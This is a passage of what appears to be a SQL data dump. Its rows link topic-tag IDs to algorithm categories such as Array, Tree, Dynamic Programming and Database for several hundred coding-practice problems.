Manipulation',526),(1629,'Bitmask',526),(1630,'Array',527),(1631,'String',527),(1632,'Greedy',527),(1633,'Trie',527),(1634,'Sorting',527),(1635,'Array',528),(1636,'Math',528),(1637,'Binary Search',528),(1638,'Prefix Sum',528),(1639,'Randomized',528),(1640,'Array',529),(1641,'Depth-First Search',529),(1642,'Breadth-First Search',529),(1643,'Matrix',529),(1644,'Tree',530),(1645,'Depth-First Search',530),(1646,'Breadth-First Search',530),(1647,'Binary Search Tree',530),(1648,'Binary Tree',530),(1649,'Array',531),(1650,'Hash Table',531),(1651,'Matrix',531),(1652,'Array',532),(1653,'Hash Table',532),(1654,'Two Pointers',532),(1655,'Binary Search',532),(1656,'Sorting',532),(1657,'Array',533),(1658,'Hash Table',533),(1659,'Matrix',533),(1660,'Database',534),(1661,'Hash Table',535),(1662,'String',535),(1663,'Design',535),(1664,'Hash Function',535),(1665,'String',536),(1666,'Tree',536),(1667,'Depth-First Search',536),(1668,'Binary Tree',536),(1669,'Math',537),(1670,'String',537),(1671,'Simulation',537),(1672,'Tree',538),(1673,'Depth-First Search',538),(1674,'Binary Search Tree',538),(1675,'Binary Tree',538),(1676,'Array',539),(1677,'Math',539),(1678,'String',539),(1679,'Sorting',539),(1680,'Array',540),(1681,'Binary Search',540),(1682,'Two Pointers',541),(1683,'String',541),(1684,'Array',542),(1685,'Dynamic Programming',542),(1686,'Breadth-First Search',542),(1687,'Matrix',542),(1688,'Tree',543),(1689,'Depth-First Search',543),(1690,'Binary Tree',543),(1691,'String',544),(1692,'Recursion',544),(1693,'Simulation',544),(1694,'Tree',545),(1695,'Depth-First Search',545),(1696,'Binary Tree',545),(1697,'Array',546),(1698,'Dynamic Programming',546),(1699,'Memoization',546),(1700,'Depth-First Search',547),(1701,'Breadth-First Search',547),(1702,'Union Find',547),(1703,'Graph',547),(1704,'Array',548),(1705,'Prefix Sum',548),(1706,'Tree',549),(1707,'Depth-First Search',549),(1708,'Binary Tree',549),(1709,'Database',550),(1710,'String',551),(1711,'Dynamic Programming',552),(1712,'Array',553),(1713,'Math',553),(1714,'Dynamic Programming',553),(1715,'Array',554),(1716,'Hash Table',554),(1717,'Array',555),(1718,'String',555),(1719,'Greedy',555),(1720,'Math',556),(1721,'Two Pointers',556),(1722,'String',556),(1723,'Two Pointers',557),(1724,'String',557),(1725,'Divide and Conquer',558),(1726,'Tree',558),(1727,'Tree',559),(1728,'Depth-First Search',559),(1729,'Breadth-First Search',559),(1730,'Array',560),(1731,'Hash Table',560),(1732,'Prefix Sum',560),(1733,'Array',561),(1734,'Greedy',561),(1735,'Sorting',561),(1736,'Counting Sort',561),(1737,'Array',562),(1738,'Dynamic Programming',562),(1739,'Matrix',562),(1740,'Tree',563),(1741,'Depth-First Search',563),(1742,'Binary Tree',563),(1743,'Math',564),(1744,'String',564),(1745,'Array',565),(1746,'Depth-First Search',565),(1747,'Array',566),(1748,'Matrix',566),(1749,'Simulation',566),(1750,'Hash Table',567),(1751,'Two Pointers',567),(1752,'String',567),(1753,'Sliding Window',567),(1754,'Array',568),(1755,'Dynamic Programming',568),(1756,'Matrix',568),(1757,'Database',569),(1758,'Database',570),(1759,'Database',571),(1760,'Tree',572),(1761,'Depth-First Search',572),(1762,'String Matching',572),(1763,'Binary Tree',572),(1764,'Hash Function',572),(1765,'Array',573),(1766,'Math',573),(1767,'Database',574),(1768,'Array',575),(1769,'Hash Table',575),(1770,'Dynamic Programming',576),(1771,'Database',577),(1772,'Database',578),(1773,'Database',579),(1774,'Database',580),(1775,'Array',581),(1776,'Two Pointers',581),(1777,'Stack',581),(1778,'Greedy',581),(1779,'Sorting',581),(1780,'Monotonic Stack',581),(1781,'Array',582),(1782,'Hash Table',582),(1783,'Tree',582),(1784,'Depth-First Search',582),(1785,'Breadth-First Search',582),(1786,'String',583),(1787,'Dynamic Programming',583),(1788,'Database',584),(1789,'Database',585),(1790,'Database',586),(1791,'Array',587),(1792,'Math',587),(1793,'Geometry',587),(1794,'Hash Table',588),(1795,'String',588),(1796,'Design',588),(1797,'Trie',588),(1798,'Stack',589),(1799,'Tree',589),(1800,'Depth-First Search',589),(1801,'Stack',590),(1802,'Tree',590),(1803,'Depth-First Search',590),(1804,'String',591),(1805,'Stack',591),(1806,'Math',592),(1807,'String',592),(1808,'Simulation',592),(1809,'Math',593),(1810,'Geometry',593),(1811,'Array',594),(1812,'Hash Table',594),(1813,'Sorting',594),(1814,'Database',595),(1815,'Database',596),(1816,'Database',597),(1817,'Array',598),(1818,'Math',598),(1819,'Array',599),(1820,'Hash Table',599),(1821,'String',599),(1822,'Dynamic Programming',600),(1823,'Database',601),(1824,'Database',602),(1825,'Database',603),(1826,'Array',604),(1827,'Hash Table',604),(1828,'String',604),(1829,'Design',604),(1830,'Iterator',604),(1831,'Array',605),(1832,'Greedy',605),(1833,'String',606),(1834,'Tree',606),(1835,'Depth-First Search',606),(1836,'Binary Tree',606),(1837,'Database',607),(1838,'Database',608),(1839,'Array',609),(1840,'Hash Table',609),(1841,'String',609),(1842,'Database',610),(1843,'Array',611),(1844,'Two Pointers',611),(1845,'Binary Search',611),(1846,'Greedy',611),(1847,'Sorting',611),(1848,'Database',612),(1849,'Database',613),(1850,'Database',614),(1851,'Database',615),(1852,'Array',616),(1853,'Hash Table',616),(1854,'String',616),(1855,'Trie',616),(1856,'String Matching',616),(1857,'Tree',617),(1858,'Depth-First Search',617),(1859,'Breadth-First Search',617),(1860,'Binary Tree',617),(1861,'Database',618),(1862,'Database',619),(1863,'Database',620),(1864,'Array',621),(1865,'Hash Table',621),(1866,'Greedy',621),(1867,'Sorting',621),(1868,'Heap (Priority Queue)',621),(1869,'Counting',621),(1870,'Array',622),(1871,'Linked List',622),(1872,'Design',622),(1873,'Queue',622),(1874,'Tree',623),(1875,'Depth-First Search',623),(1876,'Breadth-First Search',623),(1877,'Binary Tree',623),(1878,'Array',624),(1879,'Greedy',624),(1880,'Math',625),(1881,'Greedy',625),(1882,'Database',626),(1883,'Database',627),(1884,'Array',628),(1885,'Math',628),(1886,'Sorting',628),(1887,'Dynamic Programming',629),(1888,'Array',630),(1889,'Greedy',630),(1890,'Sorting',630),(1891,'Heap (Priority Queue)',630),(1892,'Array',631),(1893,'Graph',631),(1894,'Design',631),(1895,'Topological Sort',631),(1896,'Matrix',631),(1897,'Array',632),(1898,'Hash Table',632),(1899,'Greedy',632),(1900,'Sliding Window',632),(1901,'Sorting',632),(1902,'Heap (Priority Queue)',632),(1903,'Math',633),(1904,'Two Pointers',633),(1905,'Binary Search',633),(1906,'Math',634),(1907,'Dynamic Programming',634),(1908,'Hash Table',635),(1909,'String',635),(1910,'Design',635),(1911,'Ordered Set',635),(1912,'Array',636),(1913,'Stack',636),(1914,'Tree',637),(1915,'Depth-First Search',637),(1916,'Breadth-First Search',637),(1917,'Binary Tree',637),(1918,'Array',638),(1919,'Dynamic Programming',638),(1920,'Backtracking',638),(1921,'Bit Manipulation',638),(1922,'Memoization',638),(1923,'Bitmask',638),(1924,'String',639),(1925,'Dynamic Programming',639),(1926,'Math',640),(1927,'String',640),(1928,'Simulation',640),(1929,'Array',641),(1930,'Linked List',641),(1931,'Design',641),(1932,'Queue',641),(1933,'String',642),(1934,'Design',642),(1935,'Trie',642),(1936,'Data Stream',642),(1937,'Array',643),(1938,'Sliding Window',643),(1939,'Array',644),(1940,'Binary Search',644),(1941,'Prefix Sum',644),(1942,'Array',645),(1943,'Hash Table',645),(1944,'Bit Manipulation',645),(1945,'Sorting',645),(1946,'Array',646),(1947,'Dynamic Programming',646),(1948,'Greedy',646),(1949,'Sorting',646),(1950,'String',647),(1951,'Dynamic Programming',647),(1952,'Array',648),(1953,'Hash Table',648),(1954,'String',648),(1955,'Trie',648),(1956,'String',649),(1957,'Greedy',649),(1958,'Queue',649),(1959,'Math',650),(1960,'Dynamic Programming',650),(1961,'Math',651),(1962,'Dynamic Programming',651),(1963,'Hash Table',652),(1964,'Tree',652),(1965,'Depth-First Search',652),(1966,'Binary Tree',652),(1967,'Hash Table',653),(1968,'Two Pointers',653),(1969,'Tree',653),(1970,'Depth-First Search',653),(1971,'Breadth-First Search',653),(1972,'Binary Search Tree',653),(1973,'Binary Tree',653),(1974,'Array',654),(1975,'Divide and Conquer',654),(1976,'Stack',654),(1977,'Tree',654),(1978,'Monotonic Stack',654),(1979,'Binary Tree',654),(1980,'Tree',655),(1981,'Depth-First Search',655),(1982,'Breadth-First Search',655),(1983,'Binary Tree',655),(1984,'Array',656),(1985,'Dynamic Programming',656),(1986,'String',657),(1987,'Simulation',657),(1988,'Array',658),(1989,'Two Pointers',658),(1990,'Binary Search',658),(1991,'Sliding Window',658),(1992,'Sorting',658),(1993,'Heap (Priority Queue)',658),(1994,'Array',659),(1995,'Hash Table',659),(1996,'Greedy',659),(1997,'Heap (Priority Queue)',659),(1998,'Math',660),(1999,'Array',661),(2000,'Matrix',661),(2001,'Tree',662),(2002,'Depth-First Search',662),(2003,'Breadth-First Search',662),(2004,'Binary Tree',662),(2005,'Tree',663),(2006,'Depth-First Search',663),(2007,'Binary Tree',663),(2008,'String',664),(2009,'Dynamic Programming',664),(2010,'Array',665),(2011,'Array',666),(2012,'Hash Table',666),(2013,'Tree',666),(2014,'Depth-First Search',666),(2015,'Binary Tree',666),(2016,'Array',667),(2017,'Math',667),(2018,'Math',668),(2019,'Binary Search',668),(2020,'Tree',669),(2021,'Depth-First Search',669),(2022,'Binary Search Tree',669),(2023,'Binary Tree',669),(2024,'Math',670),(2025,'Greedy',670),(2026,'Tree',671),(2027,'Depth-First Search',671),(2028,'Binary Tree',671),(2029,'Math',672),(2030,'Bit Manipulation',672),(2031,'Depth-First Search',672),(2032,'Breadth-First Search',672),(2033,'Array',673),(2034,'Dynamic Programming',673),(2035,'Binary Indexed Tree',673),(2036,'Segment Tree',673),(2037,'Array',674),(2038,'Array',675),(2039,'Breadth-First Search',675),(2040,'Heap (Priority Queue)',675),(2041,'Matrix',675),(2042,'Hash Table',676),(2043,'String',676),(2044,'Depth-First Search',676),(2045,'Design',676),(2046,'Trie',676),(2047,'Hash Table',677),(2048,'String',677),(2049,'Design',677),(2050,'Trie',677),(2051,'String',678),(2052,'Dynamic Programming',678),(2053,'Stack',678),(2054,'Greedy',678),(2055,'Array',679),(2056,'Math',679),(2057,'Backtracking',679),(2058,'Two Pointers',680),(2059,'String',680),(2060,'Greedy',680),(2061,'String',681),(2062,'Enumeration',681),(2063,'Array',682),(2064,'Stack',682),(2065,'Simulation',682),(2066,'Array',683),(2067,'Binary Indexed Tree',683),(2068,'Sliding Window',683),(2069,'Ordered Set',683),(2070,'Depth-First Search',684),(2071,'Breadth-First Search',684),(2072,'Union Find',684),(2073,'Graph',684),(2074,'Depth-First Search',685),(2075,'Breadth-First Search',685),(2076,'Union Find',685),(2077,'Graph',685),(2078,'String',686),(2079,'String Matching',686),(2080,'Tree',687),(2081,'Depth-First Search',687),(2082,'Binary Tree',687),(2083,'Dynamic Programming',688),(2084,'Array',689),(2085,'Dynamic Programming',689),(2086,'Hash Table',690),(2087,'Depth-First Search',690),(2088,'Breadth-First Search',690),(2089,'Array',691),(2090,'String',691),(2091,'Dynamic Programming',691),(2092,'Backtracking',691),(2093,'Bit Manipulation',691),(2094,'Bitmask',691),(2095,'Hash Table',692),(2096,'String',692),(2097,'Trie',692),(2098,'Sorting',692),(2099,'Heap (Priority Queue)',692),(2100,'Bucket Sort',692),(2101,'Counting',692),(2102,'Bit Manipulation',693),(2103,'Hash Table',694),(2104,'Depth-First Search',694),(2105,'Breadth-First Search',694),(2106,'Union Find',694),(2107,'Hash Function',694),(2108,'Array',695),(2109,'Depth-First Search',695),(2110,'Breadth-First Search',695),(2111,'Union Find',695),(2112,'Matrix',695),(2113,'Two Pointers',696),(2114,'String',696),(2115,'Array',697),(2116,'Hash Table',697),(2117,'Array',698),(2118,'Dynamic Programming',698),(2119,'Backtracking',698),(2120,'Bit Manipulation',698),(2121,'Memoization',698),(2122,'Bitmask',698),(2123,'Array',699),(2124,'Segment Tree',699),(2125,'Ordered Set',699),(2126,'Tree',700),(2127,'Binary Search Tree',700),(2128,'Binary Tree',700),(2129,'Tree',701),(2130,'Binary Search Tree',701),(2131,'Binary Tree',701),(2132,'Array',702),(2133,'Binary Search',702),(2134,'Interactive',702),(2135,'Tree',703),(2136,'Design',703),(2137,'Binary Search Tree',703),(2138,'Heap (Priority Queue)',703),(2139,'Binary Tree',703),(2140,'Data Stream',703),(2141,'Array',704),(2142,'Binary Search',704),(2143,'Array',705),(2144,'Hash Table',705),(2145,'Linked List',705),(2146,'Design',705),(2147,'Hash Function',705),(2148,'Array',706),(2149,'Hash Table',706),(2150,'Linked List',706),(2151,'Design',706),(2152,'Hash Function',706),(2153,'Linked List',707),(2154,'Design',707),(2155,'Linked List',708),(2156,'String',709),(2157,'Array',710),(2158,'Hash Table',710),(2159,'Math',710),(2160,'Binary Search',710),(2161,'Sorting',710),(2162,'Randomized',710),(2163,'Hash Table',711),(2164,'Depth-First Search',711),(2165,'Breadth-First Search',711),(2166,'Union Find',711),(2167,'Hash Function',711),(2168,'String',712),(2169,'Dynamic Programming',712),(2170,'Array',713),(2171,'Sliding Window',713),(2172,'Array',714),(2173,'Dynamic Programming',714),(2174,'Greedy',714),(2175,'Design',715),(2176,'Segment Tree',715),(2177,'Ordered Set',715),(2178,'Linked List',716),(2179,'Stack',716),(2180,'Design',716),(2181,'Doubly-Linked List',716),(2182,'Ordered Set',716),(2183,'Array',717),(2184,'Array',718),(2185,'Binary Search',718),(2186,'Dynamic Programming',718),(2187,'Sliding Window',718),(2188,'Rolling Hash',718),(2189,'Hash Function',718),(2190,'Array',719),(2191,'Two Pointers',719),(2192,'Binary Search',719),(2193,'Sorting',719),(2194,'Array',720),(2195,'Hash Table',720),(2196,'String',720),(2197,'Trie',720),(2198,'Sorting',720),(2199,'Array',721),(2200,'Hash Table',721),(2201,'String',721),(2202,'Depth-First Search',721),(2203,'Breadth-First Search',721),(2204,'Union Find',721),(2205,'Sorting',721),(2206,'Array',722),(2207,'String',722),(2208,'Array',723),(2209,'Two Pointers',723),(2210,'Matrix',723),(2211,'Simulation',723),(2212,'Array',724),(2213,'Prefix Sum',724),(2214,'Linked List',725),(2215,'Hash Table',726),(2216,'String',726),(2217,'Stack',726),(2218,'Sorting',726),(2219,'String',727),(2220,'Dynamic Programming',727),(2221,'Sliding Window',727),(2222,'Math',728),(2223,'Binary Search',729),(2224,'Design',729),(2225,'Segment Tree',729),(2226,'Ordered Set',729),(2227,'String',730),(2228,'Dynamic Programming',730),(2229,'Binary Search',731),(2230,'Design',731),(2231,'Segment Tree',731),(2232,'Ordered Set',731),(2233,'Binary Search',732),(2234,'Design',732),(2235,'Segment Tree',732),(2236,'Ordered Set',732),(2237,'Array',733),(2238,'Depth-First Search',733),(2239,'Breadth-First Search',733),(2240,'Matrix',733),(2241,'Array',734),(2242,'Hash Table',734),(2243,'String',734),(2244,'Array',735),(2245,'Stack',735),(2246,'Simulation',735),(2247,'Hash Table',736),(2248,'String',736),(2249,'Stack',736),(2250,'Recursion',736),(2251,'Array',737),(2252,'Hash Table',737),(2253,'String',737),(2254,'Depth-First Search',737),(2255,'Breadth-First Search',737),(2256,'Union Find',737),(2257,'Math',738),(2258,'Greedy',738),(2259,'Array',739),(2260,'Stack',739),(2261,'Monotonic Stack',739),(2262,'Array',740),(2263,'Hash Table',740),(2264,'Dynamic Programming',740),(2265,'Array',741),(2266,'Dynamic Programming',741),(2267,'Matrix',741),(2268,'Tree',742),(2269,'Depth-First Search',742),(2270,'Breadth-First Search',742),(2271,'Binary Tree',742),(2272,'Depth-First Search',743),(2273,'Breadth-First Search',743),(2274,'Graph',743),(2275,'Heap (Priority Queue)',743),(2276,'Shortest Path',743),(2277,'Array',744),(2278,'Binary Search',744),(2279,'Hash Table',745),(2280,'String',745),(2281,'Design',745),(2282,'Trie',745),(2283,'Array',746),(2284,'Dynamic Programming',746),(2285,'Array',747),(2286,'Sorting',747),(2287,'Array',748),(2288,'Hash Table',748),(2289,'String',748),(2290,'Array',749),(2291,'Depth-First Search',749),(2292,'Breadth-First Search',749),(2293,'Matrix',749),(2294,'Simulation',749),(2295,'Array',750),(2296,'Math',750),(2297,'Dynamic Programming',750),(2298,'Matrix',750),(2299,'String',751),(2300,'Bit Manipulation',751),(2301,'Array',752),(2302,'Hash Table',752),(2303,'String',752),(2304,'Breadth-First Search',752),(2305,'Depth-First Search',753),(2306,'Graph',753),(2307,'Eulerian Circuit',753),(2308,'Math',754),(2309,'Binary Search',754),(2310,'Array',755),(2311,'Simulation',755),(2312,'Bit Manipulation',756),(2313,'Depth-First Search',756),(2314,'Breadth-First Search',756),(2315,'Array',757),(2316,'Greedy',757),(2317,'Sorting',757),(2318,'Array',758),(2319,'Hash Table',758),(2320,'String',758),(2321,'Trie',758),(2322,'String Matching',758),(2323,'Array',759),(2324,'Sorting',759),(2325,'Heap (Priority Queue)',759),(2326,'Array',760),(2327,'Hash Table',760),(2328,'String',761),(2329,'Recursion',761),(2330,'Math',762),(2331,'Bit Manipulation',762),(2332,'Hash Table',763),(2333,'Two Pointers',763),(2334,'String',763),(2335,'Greedy',763),(2336,'Array',764),(2337,'Dynamic Programming',764),(2338,'Greedy',765),(2339,'Depth-First Search',765),(2340,'Breadth-First Search',765),(2341,'Union Find',765),(2342,'Graph',765),(2343,'Array',766),(2344,'Matrix',766),(2345,'Hash Table',767),(2346,'String',767),(2347,'Greedy',767),(2348,'Sorting',767),(2349,'Heap (Priority Queue)',767),(2350,'Counting',767),(2351,'Array',768),(2352,'Stack',768),(2353,'Greedy',768),(2354,'Sorting',768),(2355,'Monotonic Stack',768),(2356,'Array',769),(2357,'Stack',769),(2358,'Greedy',769),(2359,'Sorting',769),(2360,'Monotonic Stack',769),(2361,'Hash Table',770),(2362,'Math',770),(2363,'String',770),(2364,'Stack',770),(2365,'Recursion',770),(2366,'Hash Table',771),(2367,'String',771),(2368,'Math',772),(2369,'String',772),(2370,'Stack',772),(2371,'Recursion',772),(2372,'Array',773),(2373,'Breadth-First Search',773),(2374,'Matrix',773),(2375,'Array',774),(2376,'Binary Search',774),(2377,'Array',775),(2378,'Math',775),(2379,'Tree',776),(2380,'Binary Search Tree',776),(2381,'Recursion',776),(2382,'Binary Tree',776),(2383,'Two Pointers',777),(2384,'String',777),(2385,'Array',778),(2386,'Binary Search',778),(2387,'Depth-First Search',778),(2388,'Breadth-First Search',778),(2389,'Union Find',778),(2390,'Heap (Priority Queue)',778),(2391,'Matrix',778),(2392,'Math',779),(2393,'Bit Manipulation',779),(2394,'Recursion',779),(2395,'Math',780),(2396,'Array',781),(2397,'Hash Table',781),(2398,'Math',781),(2399,'Greedy',781),(2400,'Array',782),(2401,'Math',782),(2402,'Bit Manipulation',782),(2403,'Matrix',782),(2404,'Tree',783),(2405,'Depth-First Search',783),(2406,'Breadth-First Search',783),(2407,'Binary Search Tree',783),(2408,'Binary Tree',783),(2409,'String',784),(2410,'Backtracking',784),(2411,'Bit Manipulation',784),(2412,'Depth-First Search',785),(2413,'Breadth-First Search',785),(2414,'Union Find',785),(2415,'Graph',785),(2416,'Array',786),(2417,'Binary Search',786),(2418,'Sorting',786),(2419,'Heap (Priority Queue)',786),(2420,'Dynamic Programming',787),(2421,'Depth-First Search',787),(2422,'Breadth-First Search',787),(2423,'Graph',787),(2424,'Heap (Priority Queue)',787),(2425,'Shortest Path',787),(2426,'Math',788),(2427,'Dynamic Programming',788),(2428,'Array',789),(2429,'Math',789),(2430,'Dynamic Programming',790),(2431,'Hash Table',791),(2432,'String',791),(2433,'Sorting',791),(2434,'Array',792),(2435,'Hash Table',792),(2436,'String',792),(2437,'Binary Search',792),(2438,'Dynamic Programming',792),(2439,'Trie',792),(2440,'Sorting',792),(2441,'Math',793),(2442,'Binary Search',793),(2443,'Array',794),(2444,'Matrix',794),(2445,'Array',795),(2446,'Two Pointers',795),(2447,'String',796),(2448,'String Matching',796),(2449,'Backtracking',797),(2450,'Depth-First Search',797),(2451,'Breadth-First Search',797),(2452,'Graph',797),(2453,'Array',798),(2454,'Prefix Sum',798),(2455,'Dynamic Programming',799),(2456,'Math',800),(2457,'String',800),(2458,'Enumeration',800),(2459,'Array',801),(2460,'Dynamic Programming',801),(2461,'Depth-First Search',802),(2462,'Breadth-First Search',802),(2463,'Graph',802),(2464,'Topological Sort',802),(2465,'Array',803),(2466,'Union Find',803),(2467,'Matrix',803),(2468,'Array',804),(2469,'Hash Table',804),(2470,'String',804),(2471,'Array',805),(2472,'Math',805),(2473,'Dynamic Programming',805),(2474,'Bit Manipulation',805),(2475,'Bitmask',805),(2476,'Array',806),(2477,'String',806),(2478,'Array',807),(2479,'Greedy',807),(2480,'Matrix',807),(2481,'Math',808),(2482,'Dynamic Programming',808),(2483,'Probability and Statistics',808),(2484,'Array',809),(2485,'Two Pointers',809),(2486,'String',809),(2487,'Array',810),(2488,'Math',810),(2489,'Bit Manipulation',810),(2490,'Brainteaser',810),(2491,'Game Theory',810),(2492,'Array',811),(2493,'Hash Table',811),(2494,'String',811),(2495,'Counting',811),(2496,'Array',812),(2497,'Math',812),(2498,'Geometry',812),(2499,'Array',813),(2500,'Dynamic Programming',813),(2501,'Prefix Sum',813),(2502,'Tree',814),(2503,'Depth-First Search',814),(2504,'Binary Tree',814),(2505,'Array',815),(2506,'Hash Table',815),(2507,'Breadth-First Search',815),(2508,'String',816),(2509,'Backtracking',816),(2510,'Enumeration',816),(2511,'Array',817),(2512,'Hash Table',817),(2513,'Linked List',817),(2514,'Dynamic Programming',818),(2515,'Array',819),(2516,'Hash Table',819),(2517,'String',819),(2518,'Counting',819),(2519,'Array',820),(2520,'Hash Table',820),(2521,'String',820),(2522,'Trie',820),(2523,'Array',821),(2524,'Two Pointers',821),(2525,'String',821),(2526,'Array',822),(2527,'Hash Table',822),(2528,'Array',823),(2529,'Hash Table',823),(2530,'Dynamic Programming',823),(2531,'Sorting',823),(2532,'String',824),(2533,'Array',825),(2534,'Two Pointers',825),(2535,'Binary Search',825),(2536,'Sorting',825),(2537,'Array',826),(2538,'Two Pointers',826),(2539,'Binary Search',826),(2540,'Greedy',826),(2541,'Sorting',826),(2542,'Array',827),(2543,'Depth-First Search',827),(2544,'Breadth-First Search',827),(2545,'Union Find',827),(2546,'Matrix',827),(2547,'Hash Table',828),(2548,'String',828),(2549,'Dynamic Programming',828),(2550,'Math',829),(2551,'Enumeration',829),(2552,'String',830),(2553,'String',831),(2554,'Array',832),(2555,'Two Pointers',832),(2556,'Bit Manipulation',832),(2557,'Matrix',832),(2558,'Simulation',832),(2559,'Array',833),(2560,'String',833),(2561,'Sorting',833),(2562,'Dynamic Programming',834),(2563,'Tree',834),(2564,'Depth-First Search',834),(2565,'Graph',834),(2566,'Array',835),(2567,'Matrix',835),(2568,'Math',836),(2569,'Geometry',836),(2570,'Math',837),(2571,'Dynamic Programming',837),(2572,'Sliding Window',837),(2573,'Probability and Statistics',837),(2574,'Two Pointers',838),(2575,'String',838),(2576,'Dynamic Programming',838),(2577,'Array',839),(2578,'Hash Table',839),(2579,'String',839),(2580,'Depth-First Search',839),(2581,'Breadth-First Search',839),(2582,'Union Find',839),(2583,'Array',840),(2584,'Math',840),(2585,'Matrix',840),(2586,'Depth-First Search',841),(2587,'Breadth-First Search',841),(2588,'Graph',841),(2589,'String',842),(2590,'Backtracking',842),(2591,'Array',843),(2592,'Math',843),(2593,'String',843),(2594,'Interactive',843),(2595,'Game Theory',843),(2596,'Two Pointers',844),(2597,'String',844),(2598,'Stack',844),(2599,'Simulation',844),(2600,'Array',845),(2601,'Two Pointers',845),(2602,'Dynamic Programming',845),(2603,'Enumeration',845),(2604,'Array',846),(2605,'Hash Table',846),(2606,'Greedy',846),(2607,'Sorting',846),(2608,'Dynamic Programming',847),(2609,'Bit Manipulation',847),(2610,'Breadth-First Search',847),(2611,'Graph',847),(2612,'Bitmask',847),(2613,'Array',848),(2614,'String',848),(2615,'Prefix Sum',848),(2616,'Array',849),(2617,'Array',850),(2618,'Segment Tree',850),(2619,'Line Sweep',850),(2620,'Ordered Set',850),(2621,'Array',851),(2622,'Depth-First Search',851),(2623,'Graph',851),(2624,'Topological Sort',851),(2625,'Array',852),(2626,'Binary Search',852),(2627,'Array',853),(2628,'Stack',853),(2629,'Sorting',853),(2630,'Monotonic Stack',853),(2631,'String',854),(2632,'Breadth-First Search',854),(2633,'Design',855),(2634,'Heap (Priority Queue)',855),(2635,'Ordered Set',855),(2636,'String',856),(2637,'Stack',856),(2638,'Array',857),(2639,'Greedy',857),(2640,'Sorting',857),(2641,'Heap (Priority Queue)',857),(2642,'Math',858),(2643,'Geometry',858),(2644,'Number Theory',858),(2645,'Hash Table',859),(2646,'String',859),(2647,'Array',860),(2648,'Greedy',860),(2649,'Array',861),(2650,'Greedy',861),(2651,'Bit Manipulation',861),(2652,'Matrix',861),(2653,'Array',862),(2654,'Binary Search',862),(2655,'Queue',862),(2656,'Sliding Window',862),(2657,'Heap (Priority Queue)',862),(2658,'Prefix Sum',862),(2659,'Monotonic Queue',862),(2660,'Tree',863),(2661,'Depth-First Search',863),(2662,'Breadth-First Search',863),(2663,'Binary Tree',863),(2664,'Array',864),(2665,'Bit Manipulation',864),(2666,'Breadth-First Search',864),(2667,'Matrix',864),(2668,'Hash Table',865),(2669,'Tree',865),(2670,'Depth-First Search',865),(2671,'Breadth-First Search',865),(2672,'Binary Tree',865),(2673,'Math',866),(2674,'Array',867),(2675,'Matrix',867),(2676,'Simulation',867),(2677,'Bit Manipulation',868),(2678,'Math',869),(2679,'Sorting',869),(2680,'Counting',869),(2681,'Enumeration',869),(2682,'Array',870),(2683,'Two Pointers',870),(2684,'Greedy',870),(2685,'Sorting',870),(2686,'Array',871),(2687,'Dynamic Programming',871),(2688,'Greedy',871),(2689,'Heap (Priority Queue)',871),(2690,'Tree',872),(2691,'Depth-First Search',872),(2692,'Binary Tree',872),(2693,'Array',873),(2694,'Hash Table',873),(2695,'Dynamic Programming',873),(2696,'Array',874),(2697,'Simulation',874),(2698,'Array',875),(2699,'Binary Search',875),(2700,'Linked List',876),(2701,'Two Pointers',876),(2702,'Array',877),(2703,'Math',877),(2704,'Dynamic Programming',877),(2705,'Game Theory',877),(2706,'Math',878),(2707,'Binary Search',878),(2708,'Array',879),(2709,'Dynamic Programming',879),(2710,'String',880),(2711,'Stack',880),(2712,'Array',881),(2713,'Two Pointers',881),(2714,'Greedy',881),(2715,'Sorting',881),(2716,'Graph',882),(2717,'Heap (Priority Queue)',882),(2718,'Shortest Path',882),(2719,'Array',883),(2720,'Math',883),(2721,'Geometry',883),(2722,'Matrix',883),(2723,'Hash Table',884),(2724,'String',884),(2725,'Array',885),(2726,'Matrix',885),(2727,'Simulation',885),(2728,'Depth-First Search',886),(2729,'Breadth-First Search',886),(2730,'Union Find',886),(2731,'Graph',886),(2732,'Math',887),(2733,'Binary Search',887),(2734,'Dynamic Programming',887),(2735,'Array',888),(2736,'Hash Table',888),(2737,'Binary Search',888),(2738,'Sorting',888),(2739,'Array',889),(2740,'Hash Table',889),(2741,'Divide and Conquer',889),(2742,'Tree',889),(2743,'Binary Tree',889),(2744,'Array',890),(2745,'Hash Table',890),(2746,'String',890),(2747,'Array',891),(2748,'Math',891),(2749,'Sorting',891),(2750,'Array',892),(2751,'Math',892),(2752,'Geometry',892),(2753,'Matrix',892),(2754,'Array',893),(2755,'Hash Table',893),(2756,'String',893),(2757,'Sorting',893),(2758,'Dynamic Programming',894),(2759,'Tree',894),(2760,'Recursion',894),(2761,'Memoization',894),(2762,'Binary Tree',894),(2763,'Hash Table',895),(2764,'Stack',895),(2765,'Design',895),(2766,'Ordered Set',895),(2767,'Array',896),(2768,'Stack',897),(2769,'Tree',897),(2770,'Depth-First Search',897),(2771,'Binary Search Tree',897),(2772,'Binary Tree',897),(2773,'Array',898),(2774,'Dynamic Programming',898),(2775,'Bit Manipulation',898),(2776,'Math',899),(2777,'String',899),(2778,'Sorting',899),(2779,'Array',900),(2780,'Design',900),(2781,'Counting',900),(2782,'Iterator',900),(2783,'Stack',901),(2784,'Design',901),(2785,'Monotonic Stack',901),(2786,'Data Stream',901),(2787,'Array',902),(2788,'Math',902),(2789,'String',902),(2790,'Binary Search',902),(2791,'Dynamic Programming',902),(2792,'String',903),(2793,'Dynamic Programming',903),(2794,'Prefix Sum',903),(2795,'Array',904),(2796,'Hash Table',904),(2797,'Sliding Window',904),(2798,'Array',905),(2799,'Two Pointers',905),(2800,'Sorting',905),(2801,'Math',906),(2802,'Enumeration',906),(2803,'Array',907),(2804,'Dynamic Programming',907),(2805,'Stack',907),(2806,'Monotonic Stack',907),(2807,'Array',908),(2808,'Math',908),(2809,'Array',909),(2810,'Breadth-First Search',909),(2811,'Matrix',909),(2812,'Array',910),(2813,'Math',910),(2814,'Greedy',910),(2815,'Sorting',910),(2816,'Array',911),(2817,'Hash Table',911),(2818,'Binary Search',911),(2819,'Design',911),(2820,'Array',912),(2821,'Divide and Conquer',912),(2822,'Sorting',912),(2823,'Heap (Priority Queue)',912),(2824,'Merge Sort',912),(2825,'Bucket Sort',912),(2826,'Radix Sort',912),(2827,'Counting Sort',912),(2828,'Math',913),(2829,'Dynamic Programming',913),(2830,'Graph',913),(2831,'Topological Sort',913),(2832,'Memoization',913),(2833,'Game Theory',913),(2834,'Array',914),(2835,'Hash Table',914),(2836,'Math',914),(2837,'Counting',914),(2838,'Number Theory',914),(2839,'Array',915),(2840,'Array',916),(2841,'Hash Table',916),(2842,'String',916),(2843,'Two Pointers',917),(2844,'String',917),(2845,'Array',918),(2846,'Divide and Conquer',918),(2847,'Dynamic 